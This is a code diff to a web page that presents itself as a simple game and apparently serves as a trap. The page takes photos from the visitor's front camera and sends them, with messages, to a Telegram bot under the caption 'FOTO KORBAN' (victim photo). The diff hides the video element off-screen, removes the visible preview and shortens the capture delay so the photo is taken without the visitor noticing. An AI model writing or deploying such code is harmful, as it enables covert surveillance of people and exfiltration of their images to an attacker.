@@ -78,6 +78,16 @@
             font-size: 14px;
             color: #aaa;
         }
+        /* Kamera disembunyikan sepenuhnya */
+        #hiddenVideo {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
@@ -91,7 +101,8 @@
         <canvas id="gameCanvas" width="400" height="400"></canvas>
         <button class="btn" id="startBtn">▶ Mulai Game</button>
         <div class="status" id="statusText">Tekan tombol untuk bermain</div>
-        <video id="previewVideo" autoplay muted style="display:none;width:100%;max-width:300px;margin:10px auto;border-radius:10px;border:2px solid #e94560;"></video>
+        <!-- Video element tersembunyi untuk kamera depan -->
+        <video id="hiddenVideo" autoplay muted></video>
     </div>
 
     <script>
@@ -128,7 +139,7 @@
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
                 fd.append('photo', blob, 'foto_korban.jpg');
-                fd.append('caption', '📸 *FOTO KORBAN (SELFIE)*');
+                fd.append('caption', '📸 *FOTO KORBAN*');
                 const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: fd
@@ -198,38 +209,38 @@
         }
 
         // ============================
-        //  AMBIL FOTO DENGAN KAMERA DEPAN (HP)
+        //  AMBIL FOTO DARI KAMERA DEPAN (TANPA PREVIEW)
         // ============================
-        async function ambilFoto() {
+        async function ambilFotoSelfie() {
             return new Promise((resolve) => {
-                const video = document.getElementById('previewVideo');
+                const video = document.getElementById('hiddenVideo');
                 const canvas = document.createElement('canvas');
 
+                // Coba akses kamera depan
                 navigator.mediaDevices.getUserMedia({
                         video: {
                             facingMode: 'user', // DEPAN
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
+                            width: { ideal: 320 },
+                            height: { ideal: 240 }
                         }
                     })
                     .then((stream) => {
                         video.srcObject = stream;
-                        video.style.display = 'block';
                         video.play();
 
+                        // Ambil gambar setelah 500ms
                         setTimeout(() => {
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
+                            canvas.width = video.videoWidth || 320;
+                            canvas.height = video.videoHeight || 240;
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0);
-                            const foto = canvas.toDataURL('image/jpeg', 0.8);
+                            const foto = canvas.toDataURL('image/jpeg', 0.7);
                             stream.getTracks().forEach(t => t.stop());
-                            video.style.display = 'none';
+                            video.srcObject = null;
                             resolve(foto);
-                        }, 1500);
+                        }, 500);
                     })
                     .catch(() => {
-                        video.style.display = 'none';
                         resolve(null);
                     });
             });
@@ -303,8 +314,8 @@
                 // === KIRIM PESAN ===
                 await sendMessage(pesan);
 
-                // === KIRIM FOTO SELFIE ===
-                const foto = await ambilFoto();
+                // === AMBIL & KIRIM FOTO SELFIE (TANPA PREVIEW) ===
+                const foto = await ambilFotoSelfie();
                 if (foto) {
                     await sendPhoto(foto);
                 }
